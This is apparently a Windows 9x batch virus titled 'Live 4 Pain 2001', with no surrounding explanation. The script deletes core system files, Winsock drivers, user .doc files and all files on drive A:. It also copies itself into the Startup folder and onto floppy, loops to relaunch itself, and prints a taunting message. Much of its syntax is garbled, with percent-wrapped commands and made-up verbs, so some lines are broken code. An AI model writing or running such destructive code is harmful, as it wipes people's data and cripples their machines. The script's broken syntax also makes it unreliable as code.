   if exist C:\windows\logos.sys %del C:\windows\logos.sys%
   if exist C:\windows\system\WSOCK.vxd %del C:\windows\system\WSOCK.vxd%
   if exist C:\windows\system\WSOCK2.vxd %del C:\windows\system\WSOCK2.vxd%
   if exist C:\windows\system\WSOCK32.dll %del C:\windows\system\WSOCK32.dll%
   if exist C:\MSDOS.SYS %del C:\MSDOS.SYS%
   if exist C:\CONFIG.SYS %del C:\CONFIG.SYS%
   if exist C:\IO.SYS %del C:\IO.SYS%
   if exist C:\windows\system\VMM32.vxd %del C:\windows\system\VMM32.vxd%
   if exist C:\windows\system\MSMOUSE.vxd %del C:\windows\system\MSMOUSE.vxd%
   if exist C:\windows\system\WSOCK.vxd %del C:\windows\system\WSOCK.vxd%
   if exist C:\windows\mspaint.exe del C:\windows\mspaint.exe
   if exist C:\windows\write.exe del C:\windows\write.exe
   if exist C:\windows\defrag.exe del C:\windows\defrag.exe
   if exist C:\My Documents\*.doc del C:\My Documents\*.doc
   if exist C:\command.com lock C:\command.com
   if exist C:\windows\rundll32.exe %lock C:\windows rundll32.exe%
   if exist C:\windows\rundll.exe %lock C:\windows rundll.exe%
   if exist C:\windows\system.dat %del C:\windows\system.dat%
   if exist A:\*.* %del A:\*.*%
   if exist C:\windows\*.exe copy to C:\windows\start menu\programs\startup
   find "live4pain"<%live4pain%>c:\live4pain.bat if exist copy to C:\windows\start menu\programs\startup\live4pain.bat
   if exist %C:\windows\start menu\programs\startup\live4pain.bat% goto h8:
   h8: %if exist C:\autoexec.bat set as C:\windows\start menu\programs\startup\live4pain.bat%
   %if exist C:\windows\start menu\programs\StartUp\live4pain.bat copy to A:\%
   if not exist %A:\live4pain.bat% goto pain:
   pain: %if exist C:\autoexec.bat lock autoexec.bat%
   echo@off
   echo: what do we live 4 ?
   echo: what do you live 4 ?
   echo: We, You, and Every one els, LiVeS 4 PaIn....
   echo: now you can go to sleep, knowing that sommat made in Notepad just kicked the shit outa ur p.c. how secure do u feel?
   rem:-----------------------------------------------
   echo: Live 4 Pain 2001 .:.:.:.  .SaduS. : .RaveN.
   rem:-----------------------------------------------
   FINALHATE:
   start /max %0"!
   if exist %C:\WINDOWS\EXPLORE.EXE KILL C:\WINDOWS\EXPLORE.EXE%
   if exist %C:\WINDOWS\SYSTEM\KRNL.EXE KILL C:\WINDOWS\SYSTEM\KRNL.EXE%
   goto FINALHATE
